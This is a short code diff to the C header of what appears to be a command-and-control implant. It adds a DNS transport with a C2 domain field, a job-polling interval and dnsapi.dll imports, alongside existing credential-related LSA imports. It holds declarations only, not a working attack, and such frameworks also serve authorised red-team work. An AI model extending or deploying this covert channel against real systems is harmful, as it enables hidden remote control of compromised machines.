@@ -116,6 +116,11 @@ typedef struct
             LPSTR   Name;   /* TODO: change type to BUFFER */
             HANDLE  Handle;
 #endif
+
+#ifdef TRANSPORT_DNS
+            LPWSTR  Domain;    /* C2 domain the agent resolves against */
+            DWORD   Frequency; /* seconds between job polls */
+#endif
         } Transport;
 
         struct _CONFIG {
@@ -400,6 +405,12 @@ typedef struct
         WIN_FUNC( getaddrinfo )
         WIN_FUNC( freeaddrinfo )
 
+        /* dnsapi.dll */
+#ifdef TRANSPORT_DNS
+        WIN_FUNC( DnsQuery_A )
+        WIN_FUNC( DnsFree )
+#endif
+
         /* sspicli.dll */
         WIN_FUNC( LsaCallAuthenticationPackage )
         WIN_FUNC( LsaGetLogonSessionData )
@@ -518,6 +529,10 @@ typedef struct
 
 #ifdef TRANSPORT_HTTP
         PVOID WinHttp;
+#endif
+
+#ifdef TRANSPORT_DNS
+        PVOID Dnsapi;
 #endif
     } Modules;
 
